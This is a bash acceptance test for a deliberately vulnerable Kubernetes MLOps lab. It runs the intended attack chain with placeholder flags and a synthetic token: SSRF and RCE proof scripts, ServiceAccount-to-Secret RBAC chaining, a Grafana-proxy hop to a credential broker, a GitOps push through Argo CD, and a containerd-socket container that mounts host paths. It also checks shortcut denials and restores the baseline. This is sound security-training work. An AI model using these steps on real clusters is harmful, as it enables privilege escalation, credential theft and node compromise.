#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd -- "${SCRIPT_DIR}/../.." && pwd)"
STAGE2_JOB="${ROOT_DIR}/lab/stages/stage-02-rbac/attack-job.yaml"
STAGE3_CLIENT="${ROOT_DIR}/lab/stages/stage-03-monitoring/attack-client.yaml"
STAGE5_BASE="${ROOT_DIR}/lab/stages/stage-05-runtime/runtime-builder-base.yaml"
STAGE5_DESIRED="${ROOT_DIR}/lab/stages/stage-05-runtime/repository/runtime-builder/deployment.yaml"

GITEA_USER="stage3-lab-writer"
GITEA_TOKEN="SYNTHETIC_STAGE3_GIT_TOKEN"
GITEA_REPOSITORY="vuln-mlops-gitops"
GIT_BRANCH="stage4-lab"
MODELGATE_USER="system:serviceaccount:modelgate-lab:modelgate"
ARGO_USER="system:serviceaccount:stage-04-gitops:argocd-application-controller"
POC_PYTHON="${POC_PYTHON:-python3}"

WORK_DIR="$(mktemp -d)"
PORT_FORWARD_PID=""
PORT_FORWARD_LOG=""
GIT_REPOSITORY_DIR="${WORK_DIR}/repository"
RESTORE_GIT_BASELINE=false

stop_port_forward() {
  if [[ -n "$PORT_FORWARD_PID" ]] && kill -0 "$PORT_FORWARD_PID" 2>/dev/null; then
    kill "$PORT_FORWARD_PID" 2>/dev/null || true
    wait "$PORT_FORWARD_PID" 2>/dev/null || true
  fi
  PORT_FORWARD_PID=""
}

push_git_manifest() {
  local source_manifest="$1"
  local commit_message="$2"

  cp "$source_manifest" "${GIT_REPOSITORY_DIR}/runtime-builder/deployment.yaml"
  git -C "$GIT_REPOSITORY_DIR" add runtime-builder/deployment.yaml
  if git -C "$GIT_REPOSITORY_DIR" diff --cached --quiet; then
    git -C "$GIT_REPOSITORY_DIR" rev-parse HEAD
    return
  fi
  git -C "$GIT_REPOSITORY_DIR" commit -m "$commit_message" >/dev/null
  git -C "$GIT_REPOSITORY_DIR" push origin "HEAD:${GIT_BRANCH}" >/dev/null
  git -C "$GIT_REPOSITORY_DIR" rev-parse HEAD
}

point_git_remote_at_current_forward() {
  local port remote_url
  port="$(forwarded_port)"
  remote_url="http://${GITEA_USER}:${GITEA_TOKEN}@127.0.0.1:${port}/${GITEA_USER}/${GITEA_REPOSITORY}.git"
  git -C "$GIT_REPOSITORY_DIR" remote set-url origin "$remote_url"
}

cleanup() {
  local exit_code=$?
  set +e
  stop_port_forward
  if [[ "$RESTORE_GIT_BASELINE" == true && -d "${GIT_REPOSITORY_DIR}/.git" ]]; then
    start_port_forward stage-04-gitops service/gitea 3000
    point_git_remote_at_current_forward
    push_git_manifest "$STAGE5_BASE" "restore runtime-builder baseline after acceptance" >/dev/null
    kubectl -n stage-04-gitops annotate application/runtime-builder \
      argocd.argoproj.io/refresh=hard --overwrite >/dev/null 2>&1
    stop_port_forward
  fi
  kubectl -n stage-02-rbac delete job/stage-02-secret-reader --ignore-not-found >/dev/null 2>&1
  kubectl -n stage-02-rbac delete pod/stage-03-client --ignore-not-found >/dev/null 2>&1
  rm -rf -- "$WORK_DIR"
  exit "$exit_code"
}
trap cleanup EXIT

for command_name in kubectl curl git base64 mktemp "$POC_PYTHON"; do
  if ! command -v "$command_name" >/dev/null 2>&1; then
    printf 'ERROR: required acceptance command is missing: %s\n' "$command_name" >&2
    exit 1
  fi
done

"$POC_PYTHON" -c \
  'import sys, httpx, mlflow, numpy, statsmodels; assert sys.version_info[:2] == (3, 11)' \
  >/dev/null || {
    printf 'ERROR: POC_PYTHON must be the prepared Python 3.11 environment with dev requirements.\n' >&2
    exit 1
  }

start_port_forward() {
  local namespace="$1"
  local service="$2"
  local remote_port="$3"
  local attempt

  stop_port_forward
  PORT_FORWARD_LOG="${WORK_DIR}/${namespace}-${service##*/}-port-forward.log"
  kubectl -n "$namespace" port-forward \
    --address 127.0.0.1 "$service" ":${remote_port}" \
    >"$PORT_FORWARD_LOG" 2>&1 &
  PORT_FORWARD_PID=$!

  for attempt in $(seq 1 60); do
    if ! kill -0 "$PORT_FORWARD_PID" 2>/dev/null; then
      cat "$PORT_FORWARD_LOG" >&2
      printf 'ERROR: port-forward stopped unexpectedly.\n' >&2
      exit 1
    fi
    if grep -Eq "Forwarding from 127\\.0\\.0\\.1:[0-9]+ -> ${remote_port}" "$PORT_FORWARD_LOG"; then
      return
    fi
    sleep 1
  done
  printf 'ERROR: timed out waiting for port-forward.\n' >&2
  exit 1
}

forwarded_port() {
  sed -nE 's/.*127\.0\.0\.1:([0-9]+) -> [0-9]+.*/\1/p' "$PORT_FORWARD_LOG" | head -n 1
}

wait_for_argo_revision() {
  local expected_revision="$1"
  local attempt sync health revision

  kubectl -n stage-04-gitops annotate application/runtime-builder \
    argocd.argoproj.io/refresh=hard --overwrite >/dev/null
  for attempt in $(seq 1 120); do
    sync="$(kubectl -n stage-04-gitops get application runtime-builder -o jsonpath='{.status.sync.status}')"
    health="$(kubectl -n stage-04-gitops get application runtime-builder -o jsonpath='{.status.health.status}')"
    revision="$(kubectl -n stage-04-gitops get application runtime-builder -o jsonpath='{.status.sync.revision}')"
    if [[ "$sync" == "Synced" && "$health" == "Healthy" && "$revision" == "$expected_revision" ]]; then
      return
    fi
    sleep 5
  done
  printf 'ERROR: Argo CD did not reconcile revision %s.\n' "$expected_revision" >&2
  exit 1
}

printf '\n[Stage 1] synthetic SSRF and marker-only RCE\n'
start_port_forward modelgate-lab service/modelgate 80
modelgate_url="http://127.0.0.1:$(forwarded_port)"
POC_MODELGATE_URL="$modelgate_url" POC_CANARY_TARGET=eks \
  "$POC_PYTHON" "${ROOT_DIR}/poc/ssrf_canary.py"
POC_MODELGATE_URL="$modelgate_url" \
  "$POC_PYTHON" "${ROOT_DIR}/poc/rce_marker.py" --timeout 120
stop_port_forward

printf '\n[Stage 2] modelgate ServiceAccount to monitoring-runner\n'
if kubectl -n stage-02-rbac get secret/stage-02-flag \
    --as="$MODELGATE_USER" >/dev/null 2>&1; then
  printf 'ERROR: modelgate directly read the Stage 2 Secret.\n' >&2
  exit 1
fi
kubectl apply --as="$MODELGATE_USER" -f "$STAGE2_JOB"
kubectl -n stage-02-rbac wait --for=condition=complete \
  job/stage-02-secret-reader --timeout=5m
stage2_pod="$(kubectl -n stage-02-rbac get pod --as="$MODELGATE_USER" \
  -l job-name=stage-02-secret-reader -o jsonpath='{.items[0].metadata.name}')"
stage2_flag="$(kubectl -n stage-02-rbac logs --as="$MODELGATE_USER" "$stage2_pod" | base64 --decode)"
test "$stage2_flag" = 'FLAG{stage_2_rbac_chaining_placeholder}'
printf 'PASS: Stage 2 fixed Job returned the synthetic flag.\n'

printf '\n[Stage 3] Grafana datasource to credential broker\n'
kubectl apply -f "$STAGE3_CLIENT"
kubectl -n stage-02-rbac wait --for=condition=Ready pod/stage-03-client --timeout=3m
sleep 12
stage3_query="$(kubectl exec -n stage-02-rbac stage-03-client -- curl -fsS \
  'http://grafana.stage-03-monitoring.svc:3000/api/datasources/proxy/uid/stage3-prometheus/api/v1/query?query=gitops_debug_info')"
grep -q 'stage3-lab-repo-writer' <<<"$stage3_query"
grep -q 'runtime-builder' <<<"$stage3_query"
stage3_proof="$(kubectl exec -n stage-02-rbac stage-03-client -- curl -fsS \
  'http://credential-broker.stage-03-monitoring.svc:8080/exchange/stage3-lab-repo-writer')"
grep -q 'FLAG{stage_3_monitoring_trust_placeholder}' <<<"$stage3_proof"
grep -q 'SYNTHETIC_STAGE3_GIT_TOKEN' <<<"$stage3_proof"
if kubectl exec -n stage-02-rbac stage-03-client -- curl -fsS \
    --connect-timeout 5 --max-time 8 \
    'http://prometheus.stage-03-monitoring.svc:9090/api/v1/query?query=gitops_debug_info' \
    >/dev/null 2>&1; then
  printf 'ERROR: direct Prometheus shortcut succeeded.\n' >&2
  exit 1
fi
printf 'PASS: Stage 3 discovery/exchange succeeded and direct Prometheus was denied.\n'

printf '\n[Stage 4] restricted Git change to Argo reconciliation\n'
start_port_forward stage-04-gitops service/gitea 3000
gitea_port="$(forwarded_port)"
git_url="http://${GITEA_USER}:${GITEA_TOKEN}@127.0.0.1:${gitea_port}/${GITEA_USER}/${GITEA_REPOSITORY}.git"
git clone --quiet --branch "$GIT_BRANCH" --single-branch "$git_url" "$GIT_REPOSITORY_DIR"
git -C "$GIT_REPOSITORY_DIR" config user.name "$GITEA_USER"
git -C "$GIT_REPOSITORY_DIR" config user.email lab@example.invalid

printf 'shortcut-denial\n' >"${GIT_REPOSITORY_DIR}/forbidden.txt"
git -C "$GIT_REPOSITORY_DIR" add forbidden.txt
git -C "$GIT_REPOSITORY_DIR" commit -m 'verify forbidden Git path' >/dev/null
if git -C "$GIT_REPOSITORY_DIR" push origin "HEAD:${GIT_BRANCH}" >/dev/null 2>&1; then
  printf 'ERROR: Stage 4 forbidden Git path was accepted.\n' >&2
  exit 1
fi
git -C "$GIT_REPOSITORY_DIR" reset --hard "origin/${GIT_BRANCH}" >/dev/null

stage5_revision="$(push_git_manifest "$STAGE5_DESIRED" 'exercise Stage 4 and Stage 5 path')"
RESTORE_GIT_BASELINE=true
stop_port_forward
wait_for_argo_revision "$stage5_revision"
kubectl -n stage-05-runtime rollout status deployment/runtime-builder --timeout=5m
stage4_proof="$(kubectl -n stage-05-runtime get deployment/runtime-builder \
  -o jsonpath='{.spec.template.metadata.annotations.lab\.vuln-mlops/stage-04-proof}')"
stage5_mode="$(kubectl -n stage-05-runtime get deployment/runtime-builder \
  -o jsonpath='{.spec.template.spec.containers[0].env[?(@.name=="STAGE5_MODE")].value}')"
test "$stage4_proof" = 'FLAG{stage_4_gitops_placeholder}'
test "$stage5_mode" = 'runtime-socket'
printf 'PASS: Stage 4 commit %s reconciled through Argo CD.\n' "$stage5_revision"

printf '\n[Stage 5] runtime socket to synthetic node proof\n'
stage5_pod="$(kubectl -n stage-05-runtime get pod -l app=runtime-builder -o json | \
  "$POC_PYTHON" -c '
import json, sys

pods = [
    pod
    for pod in json.load(sys.stdin)["items"]
    if not pod["metadata"].get("deletionTimestamp")
    and any(
        status.get("ready")
        for status in pod.get("status", {}).get("containerStatuses", [])
    )
]
if not pods:
    raise SystemExit("no current Ready runtime-builder Pod was found")
pods.sort(key=lambda pod: pod["metadata"]["creationTimestamp"])
print(pods[-1]["metadata"]["name"])
')"
stage5_uid="$(kubectl -n stage-05-runtime get pod "$stage5_pod" -o jsonpath='{.metadata.uid}')"
stage5_node="$(kubectl -n stage-05-runtime get pod "$stage5_pod" -o jsonpath='{.spec.nodeName}')"
node_role="$(kubectl get node "$stage5_node" -o jsonpath='{.metadata.labels.lab\.vuln-mlops/node-role}')"
test "$node_role" = escape
kubectl exec -n stage-05-runtime "$stage5_pod" -- test -S /run/stage5/containerd.sock

runtime_image="$(kubectl -n stage-05-runtime get pod "$stage5_pod" -o jsonpath='{.spec.containers[0].image}')"
pod_config="{\"metadata\":{\"name\":\"${stage5_pod}\",\"namespace\":\"stage-05-runtime\",\"uid\":\"${stage5_uid}\",\"attempt\":0},\"log_directory\":\"/tmp\",\"linux\":{\"cgroup_parent\":\"system.slice\"}}"
container_config="{\"metadata\":{\"name\":\"stage5-proof\",\"attempt\":1},\"image\":{\"image\":\"${runtime_image}\"},\"command\":[\"sh\",\"-c\",\"cp /proof/stage-05-proof /out/stage5-proof\"],\"log_path\":\"stage5-proof.log\",\"mounts\":[{\"container_path\":\"/proof\",\"host_path\":\"/var/lib/vuln-mlops\",\"readonly\":true},{\"container_path\":\"/out\",\"host_path\":\"/var/lib/kubelet/pods/${stage5_uid}/volumes/kubernetes.io~empty-dir/tmp\",\"readonly\":false}],\"linux\":{\"security_context\":{\"privileged\":false}}}"
pod_config_b64="$(printf '%s' "$pod_config" | base64 | tr -d '\r\n')"
container_config_b64="$(printf '%s' "$container_config" | base64 | tr -d '\r\n')"
kubectl exec -n stage-05-runtime "$stage5_pod" -- sh -ceu \
  'printf "%s" "$1" | base64 -d > /tmp/stage5-pod.json; printf "%s" "$2" | base64 -d > /tmp/stage5-container.json' \
  sh "$pod_config_b64" "$container_config_b64"

cri_args=(
  --runtime-endpoint=unix:///run/stage5/containerd.sock
  --image-endpoint=unix:///run/stage5/containerd.sock
  --timeout=120s
)
sandbox_id="$(kubectl exec -n stage-05-runtime "$stage5_pod" -- \
  crictl "${cri_args[@]}" pods --name "$stage5_pod" --quiet | head -n 1)"
test -n "$sandbox_id"
container_id="$(kubectl exec -n stage-05-runtime "$stage5_pod" -- \
  crictl "${cri_args[@]}" create "$sandbox_id" /tmp/stage5-container.json /tmp/stage5-pod.json)"
test -n "$container_id"
kubectl exec -n stage-05-runtime "$stage5_pod" -- \
  crictl "${cri_args[@]}" start "$container_id" >/dev/null
for _ in $(seq 1 50); do
  stage5_proof="$(kubectl exec -n stage-05-runtime "$stage5_pod" -- \
    sh -c 'cat /tmp/stage5-proof 2>/dev/null || true')"
  [[ "$stage5_proof" == 'FLAG{stage_5_node_placeholder}' ]] && break
  sleep 0.1
done
test "${stage5_proof:-}" = 'FLAG{stage_5_node_placeholder}'
kubectl exec -n stage-05-runtime "$stage5_pod" -- \
  crictl "${cri_args[@]}" rm "$container_id" >/dev/null 2>&1 || true

if [[ "$(kubectl auth can-i create deployments.apps --as="$ARGO_USER" -n stage-05-runtime)" != no ]]; then
  printf 'ERROR: Argo controller can create deployments.\n' >&2
  exit 1
fi
if kubectl -n stage-05-runtime patch deployment/runtime-builder --type=json \
    --patch='[{"op":"replace","path":"/spec/template/spec/nodeSelector/lab.vuln-mlops~1node-role","value":"general"}]' \
    --dry-run=server --as="$ARGO_USER" >/dev/null 2>&1; then
  printf 'ERROR: Stage 5 node shortcut was accepted.\n' >&2
  exit 1
fi
printf 'PASS: Stage 5 CRI proof reached only the escape-node proof channel.\n'

printf '\n[Cleanup] restore reviewed baseline\n'
start_port_forward stage-04-gitops service/gitea 3000
point_git_remote_at_current_forward
baseline_revision="$(push_git_manifest "$STAGE5_BASE" 'restore runtime-builder baseline after acceptance')"
stop_port_forward
wait_for_argo_revision "$baseline_revision"
kubectl -n stage-05-runtime rollout status deployment/runtime-builder --timeout=5m
RESTORE_GIT_BASELINE=false
kubectl -n stage-02-rbac delete job/stage-02-secret-reader --ignore-not-found >/dev/null
kubectl -n stage-02-rbac delete pod/stage-03-client --ignore-not-found >/dev/null

printf '\nPASS: Stage 1-5 intended path and representative shortcut denials completed.\n'
